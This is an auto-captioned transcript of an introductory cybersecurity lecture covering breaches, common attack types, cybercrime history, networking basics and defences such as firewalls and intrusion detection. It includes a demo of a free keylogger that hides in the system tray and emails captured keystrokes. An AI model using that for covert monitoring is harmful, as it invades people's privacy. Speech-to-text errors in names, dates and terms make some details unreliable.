gives them a link and they uh the demand
uh 300 to 600 to be paid to the hackers
to retrieve the decryption key for their
data now here obviously you're not going
to pay cash to hackers neither are you
going to make a bank transfer because
both of the ways you can identify the
hackers and then pursue them so the
hackers demanded this exchange via
Bitcoins cryptocurrency this is the best
way to remain anonymous and the best way
to make payments over the internet
without being identified so what was the
impact of the attack around 200 000 to
300 000 computers were infected now it
sounds like a small number of computers
when you're talking about global however
the services that it affected were huge
in UK the National Health Service got
affected all the databases got encrypted
surgeries and treatments of patients
were postponed FedEx Renault Nissan all
of these organizations got compromised
and the production lines basically shut
down for a few days till they retrieved
data from backup started to restore and
then tried to bring back everything to
normal then in February 2019 18 Dunkin
Donuts announced that the users of the
reward programs were targeted by a
credential surfing attack that means
that the attackers stole the credentials
usernames and passwords of customers of
Dunkin Donuts now we think Dunkin Donuts
they sell Donuts how much could it
impact anyone but if you have an online
account with Dunkin Donuts you also have
your personal identifiable information
stored in those accounts for example
your name address credit card
information maybe your social security
number or your national insurance card
or something like that which can lead to
identity theft people can misuse that
information pretend to be you and then
take out loans or do transactions in
your name where you are going to end up
paying those bills so stealing of such
kind of data is going to impact all the
users adversely so the first name last
name and email IDs were stolen that is
still good enough to launch social
engineering attacks and Target these
victims uh to phishing attacks or
similar attacks so now let's look at the
different types of attacks in cyber so
we're going to discuss these six malves
we are going to talk about social
engineering attacks man in the middle
attacks denial of service SQL injections
and password attacks now if you look at
this malware's basically Target hosts
operating systems social engineering
attacks would address or attack the
gullibility of a human being with the
help of a computer for example sending a
fake mail or hosting a fake website man
in the middle attack would Target a
network and then try to capture data
package within the network thus
compromising your credentials a denial
of service attack would crash a service
SQL injection attacks would attack an
application and a password attack would
attack the usernames and passwords of
accounts thus taking advantage of weak
passwords and getting access to your
accounts so let's start with malware
malware basically refers to malicious
software the first part of malicious Mal
and the wear out of software becomes
malware malwarees are nothing but
vehicles in which hackers embed payloads
they loads could be viruses worms
ransomware's Trojans so they hide these
kind of malicious softwares within
legitimate looking softwares and they
post them on the internet people who are
interested in those kind of softwares
will obviously download them and since
they are looking very legitimate they
will try to install them thus
accidentally and unknowingly installing
a trojan virus or a ransomware on their
machine now most of us have done this at
one point in time where we have looked
at pirated software because we did not
want to pay for it and then we we
probably go to tolerance and then search
for those softwares download them and
there is a keygen.exe over there which
we have to execute and then we have to
copy that code the exe file that comes
out or the key gen and then we have to
replace it and I mean it's a very
convoluted process but the fact that you
have to restore some code with some
other code would basically mean that
there is something wrong with that file
so 99 of the time these programs would
have viruses or Trojans embedded within
them and it is going to to affect the
security portion of your computers if
you scan keygen.exe's with any antivirus
across the globe they will always report
them as malware and they will probably
want to delete those kind of files so
how do these get infected it gets
infected into a system when the user
clicks on a suspicious link now
obviously if you think it is a
suspicious link you're not going to
click on it but you trust the link or
you're compelled to click on it just out
of curiosity let's say you click on that
link there's a redirector it downloads
an attachment from a malicious server
and it gets installed on your machine
most of the common ways a virus or a
worm is spread is through USB devices
people pass around USB devices like
nobody's business and you have no idea
where that a device has been used before
and you plug into your machine and if
there's a virus on that USB device it
will get infected on your machine as
well malware's are nothing but malicious
softwares that pose as legitimate
softwares but will have a virus trojan
or a worm embedded Within it right it
could also be a key logger a key logger
is nothing but another software that is
created to catch all the keystrokes that
the user is making create a copy of it
and Striker so whatever the user is
typing it will now be known to the
hacker it could be Bank details
passwords any personal information that
the user might want to keep secret if
you're going to look at three different
demos here this demo is just to Showcase
a couple of things we will going to look
at a keylogger how a keylogger works
this virtual machine here and I've
already downloaded a keylogger and
installed it the idea of this demo is to
Showcase how a keylogger functions right
so you can see online on the screen we
are using a free
keylogger.en.softonic.com we are on this
site and you can download the free
keylogger right from here what I've done
using my demos is that I've always have
a keylogger running in the background to
capture all the key stocks that I've
been doing whenever I'm doing any demos
so this keylogger here can actually be
hidden in the taskbar but for our demo
purposes have kept it visible when you
click on it it will open up and give you
a basic screen where you can start
navigating about the key logger now you
can see that on Eighth which is today it
already shows some keystrokes
applications and some visited websites
as you can see already been browsing
using the browser over here and which
has been recorded by the key logger in
the background and just to give you an
example if I click on this file you will
see all the key stops that I have been
doing so far and you can see I've gone
to this I've opened up my Mozilla
Firefox I've typed in a Kia search
keyword of free keylogger then I've gone
on to the website how secure my is my
password.net in which I may have tried
out a few passwords myself and then I've
gone and copy pasted this URL into the
browser window and you can see all of
this has been recorded and just to
emphasize on that let's go on to another
website and let's say let's go to
facebook.com I'm not actually going to
log in I'm I'm just going to type in a
random username so someone at
simplylearn.com and a password like ASD
at the rate one two three four and I'm
going to try to log in obviously the
login is going to fail because this
account doesn't exist but we want to see
what happens in the background when the
key logger picks up the keystrokes that
we have typed so let's open up the
keylogger again and go and see what is
there in the keystrokes and clipboard
and you can see over here that we typed
in facebook.com enter and then we did
not type in the username that's the
difference here we selected it from a
drop down so a keystroke logger a key
logger has not been able to capture that
input a key logger in its Essence is
only records something that has been
typed in by the user real time since we
did not type in the username it did not
record that username but we typed in the
password and you can see the password
over here ASD at the rate one two three
four and this is how a keylogger works
it only captures the key strokes that
I've been light in real time so if we
use this exercise on our victims and
they're just using drop down menus at
that point in time none of the data is
going to be recorded for that activity
you would need something which is known
as spyware which would capture screens
which would capture all of this
information that is going on now apart
from just logging keystrokes what this
software also does is it also has a list
of used applications so you can see all
the applications that have uh booted up
along with the operating system and the
ones that have started up after the
operating system has booted it also has
a list of the visited websites so you
can see these are the websites that we
have been visiting and uh they have been
listed right here the last one being
Facebook login or sign up right so this
can store history for a really long time
if I go back in time and if I look at
some of the demos that I've been looking
at so on 14th of September these were
the key strokes that I utilized when I
was doing some trainings over while I
was providing some demos on other topics
so a key stroke or a key logger will
store all that information and keep on
recording it till you actually delete
that data or you can uh you can reset
the key logger you can also set up the
keylogger to send the email to you on a
deal as a daily report to a particular
email address that you've sent so as
long as it detects the internet
connectivity this key log obviously send
you an email to the email address that
you have specified with all the key
stocks that it has locked now this is
the free version there is again a paid
version for it so you can go and visit
this site and see how this keylogger
functions if I press on the x button
over here it will ask me if I want this
to be hidden in the system tray if I
click on yes it only using this shortcut
will I be able to invoke this screen so
just for demo purposes I do not want
this to be hidden so I'm going to click
on no and you can see that the key
Locker is still visible over here so
that was the first demo that we are
seeing viruses as we all know are
destructive programs that uh once
executed would destroy data or harm the
hard disk or the partition tables worms
on the other hand would be softwares
that would be more of a nuisance value
where they're going to replicate
themselves in such a way that they would
consume the resources of a computer thus
crashing the computer and then requiring
a reboot a trojan horse is another
software that will allow a backdoor
entry or a covert channel to that hacker
where the hacker in this case would then
be able to gain access to the victim's
machine through the covert Channel or
the back door without the knowledge and
the authorization of the user themselves
let's talk about social engineering
attack now this is where your people
skills come into the picture this is the
art of manipulating people and
convincing them to give up confidential
information either knowingly or
unknowingly so most likely well uh we
trust our friends right and we talk to
them a lot and we give out some
confidential information which we would
not give out to others what if somebody
is pretending to be our friend just to
get this information out of us and we
trust this person we give out that
information and we suddenly get affected
because of that now I'm not saying that
everybody in the world does that but it
is one of the most common attacks that
is experienced in the Computing world
now social engineering attacks can be
broken down into three categories first
is a phishing attack don't worry about
that figure over there you're actually
not going to go fishing it's but
basically what known as a fishing attack
then there is a spear phishing attack
and then there's a wailing attack all of
these are types of social engineering
attacks where you have uh where you're
targeting a user by sending out fake
mails or fake websites and the
gullibility into clicking on those links
and then giving out information so what
is a phishing attack it is a practice
wherein a hacker usually sends fake
meals which look really genuine or hosts
fake websites which also look genuine
and looks like they're from a trusted
Source once you click on those links
there would be embedded scripts or
embedded malves which would then be
executed and and then get installed on
your machines compromising the security
of your device these utilities could be
used to steal credit card information
create steal data from your computer
upload data to your computer use your
computer as a bot and anything and
everything that the hacker might want to
do spear phishing is a variation of
phishing now fishing is a non-targeted
attack it is to The Whole World At Large
whoever becomes a victim becomes a
victim however spear phishing is a
targeted attack it is to a specific
individual or to a group of individuals
in an organization so it becomes a
customized attack you identify the
victim you identify the flaws that are
existing over there in the organization
you identify the gullibility of the
victim create that fake mail to suit
that particular situation send it across
to them they'll click on that link and
get infected by whatever payloads that
you have embedded within it wailing is
when you are targeting particularly
wealthy or powerful people in the
industry so normally uh when you're
targeting CEOs CFOs high level
management people of an organization it
would be known as a veiling attack so
here the example is where the email has
been received to your customer your
account is going to expire today to keep
your account activated please click on
the link here and proceed with the
verification process now here the link
that we see activate.com would be in
hyperlink which is going to mask the
actual URL with the link is going to
redirect us right here the attack is on
the gullibility of the customer where
they would fear that the account would
be deactivated and to prevent that they
would trust this email click on the link
and then provide the information
thinking that they're just reactivating
the account but they're actually leaking
their own information to the attacker so
the first thing you have to understand
is Banks or any organization are knowing
not going to send you any emails with
the link in it asking you to reactivate
or anything like that in fact Banks
proactively tell us that they're not
going to give uh call us and ask for any
information in fact they would want us
to call them on their registered number
or the helpline number that they have
declared on their website or on the
cards that we possess then moving on to
social engineering this is something
very common in today's world this is
basically where the prey is the human
itself and the reason social engineering
attacks are very successful is because
of the gullibility factor that a human
has for example human has something
called emotions that a machine wouldn't
you could plead with a human for a
password to be reset by gaining sympathy
or empathy but try doing that with a
machine those attacks are going to fail
social engineering attacks are not only
limited to those but we can talk about
fishing fishing is also a part of social
engineering attack where the gullibility
of the user to click on that link is
being exploited in this scenario here
this is Clark he's calling from the ID
security team that means that he is
impersonating properly and then telling
the victim that the system has been
compromised please share the password
with me the victim on the other hand
thinks that the person is trying to help
her probably doesn't verify that person
trust that person and then provides the
password over the phone now here it is
fear that is being exploited because the
password being compromised would clearly
upset the end user for loss of data or
for the computer revealing out
confidential information thus here she
is trusting the security team for the
password to be reset and given back to
her then we come to the network attacks
man in the middle this is also known as
eavesdropping attack which literally
means that you are going to listen in
onto somebody's conversation for example
in the figure the client is trying to
talk to the server but you become a man
in the middle and you try to listen in
on the conversation that is going on now
obviously the conversation over here may
not be audio but be data that is being
exchanged between the server and the
client you just listen in you make a
copy of that data and you store it at
your end the data could contain
usernames passwords May containing
confidential information and help you
compromise data the attacking computer
takes the IP address of the client so
you find out the IP address of the
client the client is not aware of about
this the class is trying to communicate
with the server you spoof yourself as a
default gateway or a trusted device and
the client thinks that it is through you
that they need to communicate to the
server and thus they start sending data
via your PC so this attack normally
happens on public Wi-Fi networks I've
seen that happening a lot and thus I
never recommend anyone using those
public Wi-Fi's for example you go to a
coffee shop they have free Wi-Fi over
there you connect to it and you start
surfing you start browsing you are
always signed into Google Facebook
accounts your bank accounts and whatnot
and then there's a sniffer there's a
hacker who's doing a man in the middle
attack capturing all that data now it's
not an easy attack but it can be done so
this diagram shows where the man in the
middle attack has become successful and
now that the client and the server both
are sending information via the attacker
without knowing them knowing that the
attacker is capturing all that data here
suppose you're in trouble and you need
money right now and you call your friend
and ask for money so here the person is
calling John telling John that they're
in trouble and they're asking for John
to give the credit card number over the
phone now this is a legitimate
transaction the friend is actually
calling John and asking for some help
however when John is providing that help
over the phone with the credit card
numbers maybe the CVV number and all of
that and then the OTP at the end of it
at the same time there could be a hacker
doing a man in the middle attack where
they could be eavesdropping on whatever
is being said or whatever data is being
transferred and once they capture This
Confidential data they can then misuse
that data to their own gains then comes
the denial of service attack the motive
in a Dos attack is not to benefit
monetarily but to bring down a service
for legitimate users that's just causing
harm to the organization for example if
I consume the bandwidth of to a
particular website since there's no more
bandwidth left other legitimate users
who want to interact with the website
will not be able to connect to the
website thus create creating a denial of
service to those legitimate users now it
may not be possible for me to use my
laptop to Target a cluster of servers
because obviously the bandwidth at the
other end would be very high so I would
distribute my attack across multiple
devices thus creating a distributed
denial of service also called it DDOS
attack then we come to the SQL injection
or SQL SQL stands for structured query
language which is the de facto language
that is used by applications to interact
with databases so let it be a Microsoft
SQL database mySQL database Oracle SQL
the syntax may be a little bit different
but it is still the structured query
language that applications utilize to
interact with the database now the
queries that are created by the
applications need to be sanitized at the
application Level itself so developers
need to be very careful of how they are
going to create those queries what
queries are allowed to go to the
database because the database is
designed to answer queries it doesn't
know what is a legitimate query and what
is a illegitimate query if it receives a
query is going to try to execute it and
give out information thus a hacker May
insert malicious queries or malformed
queries into a SQL Server through the
vulnerable application causing a
security event so depending on the
queries that have been created the
attacker could delete some data or
modify data add data edit it or do
anything that is malicious in nature
that would compromise the integrity and
the security of that database for
example the dunking donuts right except
apart from being a credential attack
since they got access to the database
they could have added or deleted any
information about any users that were
there a password attack as the name
suggests this attack is used to crack or
get the password for user's account or
when we say crack passwords this is
basically where somebody is trying to
brute force or they're trying to guess
the password and they're going to break
the password thus getting access to your
accounts there are five different ways
passwords can be cracked the first one
is a dictionary attack where we use
every password that is possible through
the dictionary now this the use of an
actual dictionary and that's one of the
reasons when we try to create passwords
we are advised not to create passwords
based on dictionary words because these
are easily guessable and there are lists
already out there that contain all of
these words there's a tool that you can
utilize and that tool will then pass
through each and every word that is in
the dictionary file and then compare it
to a possible password if one of the
words matches the password has then be
compromised so if you are observing a
little bit higher security where we have
created a password that is not based on
the dictionary word then we want to look
at other attacks like brute force it is
a trial and error method so basically
what we do is we identify how the
passwords were created for example in
today's world the policies would be to
consume in a password any any of the
alphabet characters A through Z
uppercase or low case 0 through 9 and
then special characters and then we want
to randomize the usage of these
characters so that they are not easily
guessed possible but a Brute Force
attack at the same time would then try
every permutation and combination there
is possible in the entire character set
and then try to figure out the password
now this takes a really long time and
does take a lot of compute and storage
power and that's where the botnet
example comes in comes back in the one
that we saw earlier which was used for
dos attack but similarly if you have
infected multiple computers like this I
can then distribute this attack onto all
those computers and use the entire
compute power that is available to
shorten the time that is required to
crack the password now based this is 100
successful given the time that it may
take so if the time that is going to
take is going to be a hundred years the
attack becomes unsuccessful because
during that period uh the password is
most likely to be changed the technology
is going to be changed and so on so
forth so if the password is easily
guessable this can be a very easy attack
to perform there are keylogger which is
a similar attack to what we have seen so
a keylogger has discussed earlier is
nothing but a software that once
installed on your machine would grab
each and every keystroke that the user
has made and store it in a file which
the hacker can later on access so
whatever you have been typing passwords
credit card information or anything else
all of those would be recorded and
stored in the file and that's one of the
best way a password can be compromised
then shoulder surfing this is a physical
attack rather than being a technical one
uh here you need to be physically be
present when the user is typing in their
password and you actually look over the
shoulder to see what they are typing and
try to figure out what the password is
if they're quick typers it is going to
be a little bit more difficult if
they're slow typers it's going to be
that much more easy and the last one is
called a rainbow table now passwords
when Applications store them are stored
in hash format hash is nothing but a
one-way signature that is created of the
password file of the word that is used
for the password and it is based on an
algorithm so the input could be a
variable for example a password would be
7 to 14 characters but the output of a
hash value would be fixed based on the
algorithm that you are consuming so most
common algorithms in today's world that
we utilize are sha secure hashing
algorithms before that we used md5 or
message digest so all of these convert
the passwords from plain text into a
hash value and store it into a database
so if you actually attack that database
to grab a password you're going to get
the hash value not the password in clear
text and thus in that scenario comes the
rainbow table to the rescue a rainbow
table is nothing but a file that will
have the list of all possible passwords
along with their hash values in the
required format so if you remember the
dictionary attack the dictionary attack
was nothing but a list of words based on
the dictionary that were stored in a
file and then the software was just
trying each and every word against a
possible password Here we do not have
the word but we have the hash value so
to reverse engineer hash value what we
created is we created a rainbow table
whether it be a list of other possible
passwords and their corresponding hash
values so we then compare the hash value
that we have captured and then search
for that hash value in the file that we
have created the hash value that matches
the corresponding word to it is the
password in clear text so these are the
five types of password attacks now let's
talk about the types of network attacks
an active attack is an attack when the
Intruder attempts to destruct the net
Network's normalcy and modifies the data
and Alters the data at the same time so
as you can see in the diagrams there's a
sender and there is a receiver attacker
is the man in the middle who is now
trying to create the active attack so
when the sender sends that data to the
receiver the attacker intercepts that
data modifies the data and then sends
the modified data to the receiver since
the attack is uh is a man in the middle
as we have seen in the previous attacks
the receiver neither the sender would be
aware of the attacker and thus they
would not be aware of the modification
that has been done in a passive attack
the Intruder just eavesdrop on the data
they just listen in onto the
conversation but they do not modify the
data at any time so they just capture
the packets they copy the contents so
that they can use that at a later stage
let's look at the history of cyber crime
so as you can see this graph shows us
how cyber crime has progressed over the
years in 1990s MNC database Pentagon and
IBM were hacked in again in 1990s
National Crackdown on criminals
Microsoft anti-operating system pierced
so uh this is where hacking started
becoming more mainstream right before
this hiking was very much limited to
organizations who used computers but in
the late 80s internet happened and then
we had e-commerce coming in which
basically led to our online retail
stores online banking and online data
stores as well which then led to
criminals hijacking this data or
hijacking your money and trying to steal
it on internet itself in 2001 cyber
criminals launched attacks against eBay
Yahoo CNN Amazon and other organizations
2007 this was where one of the biggest
bank hacks had happened Swedish Bank
Nadia they recorded at least a million
dollars being stolen in three months
from 250 accounts 2013 Adobe had 2.9
Million accounts compromised and their
usernames and passwords released on the
open internet in 2016 Kaspersky one of
the leading antivirus providers to the
world reported around 758 million
malicious attacks that occurred which
they identified themselves these are
some of the most famous faces in cyber
security or earlier cyber crime in 1988
Robert Morris he's an American Computer
scientist and entrepreneur he's best
known for creating what is called the
Morris worm and this was way back in
1988 and this is the first computer worm
that has been identified on the internet
Kevin Lee or Kevin Lee Polson in 1990 he
was accused of hacking into Los Angeles
Los Angeles radio station called KIIS
hyphen FM where there was a contest
going on and if you're a particular
number of caller and give a correct
answer you're supposed to win a Porsche
944 and he hacked the those telephone
lines ensuring that he became that
particular person and answered the
question correctly uh it was later on
revealed that this actually happened he
was jailed for it then comes David Smith
David Smith he created the Melissa virus
now Melissa virus one of the most
dynamic viruses known around March 1999
that's when this happened this virus was
released and this was a macro based
virus which affected Microsoft Word and
Outlook based files Adam bought bill in
2004 he's also an American computer
hacker from Michigan he gained
unauthorized access to Love's computer
corporate computer network via an open
unsecured wireless access points now
these access points back then were not
that much secured uh the these people
were able to identify it what they tried
to attempt by doing that was gain access
to the company's Network and install the
software which would then help them
capture credit card information of that
organization right and uh This was later
on identified as well and he was
prosecuted for that crime and got jailed
just a matter of trivia Kevin Lee Polson
he was one of the first people found
guilty and was banned from using
computers and the internet for three
years after his release in today's world
we cannot even imagine living without
the internet this guy lived for three
years without it now let's go a little
bit further and see what would motivate
people for committing such cyber crimes
right the first foremost motive is
disrupting business continuity others
would be looking at data theft or
information theft and manipulating that
data to gain from that data so if I'm
able to access your computer and steal
some data that has some value to you and
sell it or make it public you would be
at a financial loss because that data no
longer has any value creating fear and
cures by disrupting critical
infrastructure for example a company's
infrastructure crashes the services are
no longer being offered by that
organization and people start panicking
or start fearing an attack by cyber
criminals and it leads to chaos
Financial loss to the Target which is
very obvious if I do a denial of service
attack or if I make a service and a
variable from an organization what is
going to happen is since the that
service is not functioning the company
is not going to make any money out of it
and thus going to suffer a financial
loss achieving States military
objectives a one country spying on
another country trying to gather
information about their Military
Intelligence military activities or any
other activities that can harm the
original country demanding Ransom
hackers can encrypt your data and then
the amount of Ransom from you in lieu of
decrypting the data again damaging
reputation of a Target impersonating a
user on the social media platforms
making false statements thus damaging
the reputation of that person and
propagating religious or political
beliefs religious Fanatics promoting
whatever cultures that they want to
promote trying to gain more followers
thus bringing more unrest to the world
any of these could become motives for
cyber crime so this is why we want cyber
security cyber security should be in
place to prevent these kind of attacks
so what exactly is cyber security it
refers to the practice of protecting
networks programs computer systems and
their components from unauthorized
digital access and attacks so whatever
your digital footprint could it be
servers computers switches routers web
servers web applications that you're
hosting over there services that you're
consuming from the cloud or providing to
other customers you need to secure all
of these to ensure that the integrity
and the confidentiality of these
Services is intact and none of these
services are affected by any cyber
attacks which could lead to disastrous
results so the main difference we want
to understand here is the difference
between cyber security and information
security information security is data
within the organization where they
handle sensitive information or
proprietary information copyrighted or
pre-tinted information and they want to
secure it from data leaks or having
their data in somebody computer's hands
cyber security is basically a technique
used to protect the Integrity of network
so this is when you're going to go on
the web and on the internet you're going
to secure your devices that you have
deployed allowing people to access your
infrastructure from the outside so what
could be the cost of not being cyber
secure if you get hacked or if your data
is compromised or if your information is
compromised you could have a lot of
repercussions your good will be go for a
task you may be open for lawsuits not
only from clients but from customers as
well you could be open for fines or
penalties from government organizations
for failing to follow the law of the
land customer trust will obviously be
hampered if you have been hacked and
your data has been compromised you
wouldn't want to deal with that
organization in the future all of this
could land the organization in a
financial crisis where all the lawsuits
and penalties that are being imposed
could basically bankrupt that
organization and thus take it out of
circulation so now let's look at some
basic terminologies which we need to
understand to go further in the cyber
security world first and foremost
Network what is a network network is
nothing but a group of interconnected
devices could be servers could be
workstations could be laptops could be
any devices file printers and whatnot to
be interconnected with each other as you
can see in the in the diagram it is used
for communications it's used primarily
used for data transmissions and to
communicate between various terminals so
that the business can go on it is also
used to share data and information it
could be wired or Wireless so you got a
wired Lan or at home we all have
wireless networks where we connect all
our devices we use them for streaming
videos we use them to connect to the
internet serve websites work from home
so we've got office also set up on our
Wi-Fi so a network is nothing but a
collection of interconnected devices
that are allowed to communicate each
other freely so that the business can be
continued in a proper manner server now
server is nothing but a hardware device
that is supposed to handle requests of
data information allow Network Services
to function from other computers and
devices so this is where we build a
client server relationship where on the
server we've got uh we've got the major
software we've got the we got the data
that is stored over there and clients
that interact with the server to consume
that data in a particular manner that
would help them make sense and analyze
that data and generate business out of
them then the internet internet is
nothing but the collection of multiple
networks globally so all the networks
that we have across the globe when they
are interconnected with each other that
is what internet is and if you just go
back and you talk about servers this is
what allows the internet to be formed so
every organizations when they publish
their servers on the internet and they
allow everyone to interconnect through
those servers that is where the internet
comes in the servers being the backbone
of the internet obviously for the
servers to communicate with each others
we will need switches routers and other
devices for the data Transmissions to
happen so these are the multiple
networks could be individual networks
internet interconnected together would
form the internet across the globe for
the internet to work there would be a
set of protocols for transmissions to be
allowed across the globe now this is
where tcpip or the transmission control
protocol over Internet Protocol comes
into the picture so if you remember we
use communication channels like TCP or
the transmission control protocol and
UDP user datagram protocol when we
connected connect to web servers we we
talk about the HTTP protocol and https
protocol if you want it secure then
we'll talk about IMAP POP3 and all of
these protocols now where do these
protocols come from it is nothing but a
suite of the TCP software which contains
all of these protocols which allow com
computers to communicate with each other
if TCP wouldn't have been there our
Network would have collapsed now when we
have tcpe IP and we want to communicate
across the globe how would we identify
devices on the Internet or even on the
internet because the devices don't know
us they are not going to use our
usernames and passwords to communicate
with each other but when I want to
connect to a website or a device how do
I identify it on the intranet or the
internet I obviously use IP addresses
now IP addresses are nothing but the
Internet Protocol addresses which are
32-bit addresses which look exactly like
the one shown on your screen
172.16.254.1 now there is a lot of
classification of IP addresses and some
of these IPS addresses work on the
internet some of them are supposed to
work on private lands but I will Reserve
that for a later topic then the second
way that we are identified on the
Internet or the intranet are with Mac
addresses so media access controls or
Mac addresses are hard-coded addresses
that are given to our network interface
cards these cannot be modified
physically at any point in time however
there are techniques to spoof Mac
addresses which we can then obfuscate
our existing address and give us a new
one that would again be discussed in a
letter in a later lecture a router we've
been talking about routers and switches
router is nothing but a device that
passes package back and forth across
networks it routes the data in the
appropriate path so it is an intelligent
device it can understand IP addresses
and Mac addresses it can identify
different Paths of reaching a particular
Network for example if I'm sitting in
India and I want to communicate across
the world to America there would be a
specific path that needs to be followed
for my data data packet to reach the
other side of the world it is the
routers that would map this path store
it in their cachet so when I try to
connect to that server they would
retrieve it from the cache and send the
packet across the globe so the home
router that we use at home on Wi-Fi is
our default gateway to connect to the
internet and thus it allows our internal
devices to communicate with each other
within using internal IP addresses and
when we want to go to the Internet it
will then route the traffic on the
internet and send the packet to other
servers that we want to communicate with
now what is a domain a domain is
referred to as a group of computers and
other devices that are interconnected
and treated as a whole now a domain is
used by an organization so let's say if
I am XYZ XYZ being the name of the
organization and I want to create an a
domain which will allow me to create a
group of interconnected computers for my
employees to interconnect with each
other and send and manage data I am
going to create a domain for my
organization and a attach all the
devices create users and interconnect
them using a domain so this is where you
are going to have a centralized approach
of a server client relationship where
you're going to have a main domain and
you're going to have devices connected
to the doming now when we go on to the
internet the domain name is nothing but
the base part of a website name so when
you say google.com and you type it in
your browser you're taken to the webpage
called google.com which is the search
engine that you're connecting but for
Google the organization at the other end
they would have a data center over there
which would have all that relevant data
which allows you to search through that
information so for them the domain would
be the internal part where they've got
this cluster of servers creating a data
center where all that information is
stored but for us as consumers a website
called google.com would be a domain for
us to visit that particular website and
consume the services that they're
offering on the internet so here the
example is https which means that it is
a secure website Port 443 and we're
connecting to cyber security com
cybersecurity.com becomes the domain
name https becomes the protocol that we
want to utilize to connect to that
particular website then we come across
DNS or the domain name system it is
nothing but an index something like a
phone book which is responsible for
mapping the domain name into its
corresponding IP address now remember I
said that there are only two ways we are
identified on the Internet or the
intranet either the IP address or the
MAC address if it is devices but it's
computers who are talking to each other
it would obviously be IP addresses but
if I type in google.com I'm giving it a
domain name the internet does not
understand domain names so there is a
DNS a server which is an index or works
like an index or more like a phone book
which will have a list of all the
domains with the corresponding IP
addresses so whenever I type in
google.com the request goes to a DNS
server the DNS server is queried the IP
address of google.com is identified
paste it onto the packet and then the
packet is routed through the router so
the path that it has determined to reach
the google.com server here replace
google.com with cybersecurity.com so as
you can see on the screen the local PC
queries the DNS server the DNS server
replies back with the IP address now if
you're wondering how does this work if
we're going to take an example of home
networks the ISP or the internet service
provider gives us a default gateway or a
router with their own IP addresses for
DNS servers and default gateways so when
we try to connect to the router the
router has the IP address of the DNS
server and it routes that query to the
DNS server the DNS server replies back
with the appropriate IP address the
router then takes that IP address
figures out the path and sends it across
to the targeted server DHCP or the
dynamic host configuration protocol it
is a protocol that dynamically assigns
IP addresses to the devices in the
network so we have discussed that IP
addresses are required by computers to
communicate within each other but who
Associates or who gives these IP
addresses to these computers so for that
to happen we have got a DHCP server that
is created if you take your home
networks it is the router that has the
DHCP role installed on it so whenever a
machine boots up it sends out a
broadcast request looking for the DHCP
server and then there's a communication
with the DHCP server the DHCP server
then allocates an IP address to the
computer who was requesting it and once
the IP address is allocated an entry is
made in the DHCP server's cache with the
corresponding Mac address of that
particular machine then we come to the
next stop topic called VPN or a virtual
private Network it is a connection
between a VPN server and a VPN client
it's basically a encrypted channel that
you're creating between two endpoints
and the main reason for a VPN is to
encrypt your data so that it is now no
longer subject to man in the middle or
eavesdropping or modification attacks so
this is a layer of security that you are
adding when you're connecting to the
internet using an encrypted Channel
which would prevent you from getting
hacked or your data being compromised by
hackers so as you can see here and if
you remember remember the previous top
previous slides that we have seen the
hacker was able to copy the data very
easily now that it is an encrypted
Channel even if the hacker tries to
eavesdrop and capture that data it will
be formatted in such a way that they
would not be able to make sense out of
it now the attacker or the hacker will
try will have to try to decrypt the data
so that's another attack that they'd
have to execute to find out the
encryption key decrypt the data and then
look at what the data was then we come
across botnet now first let's first
understand what Bots are Bots are
nothing but the softwares that can be
installed on vulnerable machines that
would allow the hacker to send commands
to the infected machines to generate
some traffic or to do what the command
tells them to do so most of the botnets
are used for distributed denial of
service attack if you remember the dos
and DDOS that we discussed a while back
this is where we tied up with how they
are executed so a bot master or a hacker
let's call them a hacker would try to
identify vulnerable device devices
across the Internet and try to install
the bot onto those devices the bot
essentially is a software that would
revert back to the bot master and
advertise their availability whenever
they have been powered on a collection
of such infected devices would
essentially be called a botnet when
there are enough number of machines that
the attacker feels are good enough to
launch that attack on the targeted
servers the hacker will then initiate
those devices send the commands through
the bot master to the Bots and the Bots
would then generate that kind of traffic
whatever they have been configured for
and then attack the targeted server now
this is also done to up to mask the
identity of the hacker since the attack
is being generated through the botnet
the IP addresses of the botnet computers
would be reported to the targeted server
not the actual hackers IP address so it
to figure out who the attacker was would
be very much difficult depending on the
size of the botnet so this you can see
is the attack that has been created over
the victims and the malicious traffic
has been generated through the bot net
and the victims have been targeted
through that so as said once that
traffic has been done to forensically
investigate at the victim's end they
would find the IP addresses of the
botnet and not the attacker all right
let's start talking about network
security controls network security
controls are nothing but implementations
of various devices to enhance the
security of a particular Network these
could be firewalls intrusion detection
systems or intrusion prevention systems
honeypots unified threat Management
systems and so on so forth the next-gen
firewalls that we talk about right so
let's look at a review of what these
devices are now a firewall can be a
hardware or a software that is
responsible for allowing or disallowing
a certain amount of traffic to or from
your computer so these are basically
created to enhance the security posture
of your network where you can configure
them for certain level of traffic to be
allowed or some traffic to be disallowed
now a firewall is is not going to decide
by itself what is a good amount of
traffic or what is bad traffic you're
going to configure the firewall by
creating rules based on IP addresses
port numbers protocols and what may and
based on this the firewall will then
analyze the traffic coming in or going
out to the inbound or the outbound rules
and if the traffic is allowed it will
allow the traffic to go through if
there's an explicit rule which says deny
the traffic it will drop the packets or
it will delete the package it will not
allow the package to go past it so if it
is good traffic that means it matches a
rule that has been created that allows
the traffic to go through the firewall
will allow it if it's bad traffic that
means that there is a rule which denies
the traffic to pass through it will get
blocked at the firewall level itself it
will the firewall will not allow it to
enter the network similarly intrusion
detection system it is designed to
detect unauthorized access to systems or
intrusion attempts as well now it works
along with the firewall and the main
thing thing is that here there's a
database against which it can compare
the traffic so most of the attacks that
we've talked about there are some
distinct signatures that would cause
concern or that would highlight that
kind of an attack most of the
organizations try to develop these kind
of signatures have them in a database
and store them on the ideas so that
ideas can analyze the incoming traffic
look at patterns from the traffic coming
in or going out compared to the database
of the signatures that it has and if it
matches any of the signatures it will
then detect that as an attack and send
an alert to the administrator with
administrator will then have to manually
come in and check it out intrusion
prevention system as described earlier
or as mentioned earlier can be
configured to react to that particular
event so if it detects something that
can be classified as an intrusion an
administrator can pre-configure it to to
react to that particular packet in a
particular manner for example drop the
packets or reflect them to a honey pot
or want the administrator or do all of
these things at the same time so as you
can see on the diagram and the internet
there's a hacker a sense of the data
packets come in the firewall is not able
to analyze the traffic because a a
firewall cannot analyze the contents of
a packet it can only look at the header
it can only look at the IP addressing
and the ports that are that have been
created or the rules on which those
things have been mentioned and then it
allows the data to go through it reaches
the ideas the ideas then looks at two
ways to scan one is a signature that
we've just spoken about where the
developer of the IDS creates those
signatures and stores them onto the
database or another thing that is known
as heuristic scanning which is nothing
but behavioral scanning so it looks at
the behavior of the data and if the
behavior looks malicious it will then
raise an alert and want the
administrator then let's come to
honeypots we just discussed in the
previous slide that an IPS or an
intrusion prevention system can be
pre-configured that if it detects an
anomaly or if it detects an intrusion it
may redirect the traffic to a Honeypot
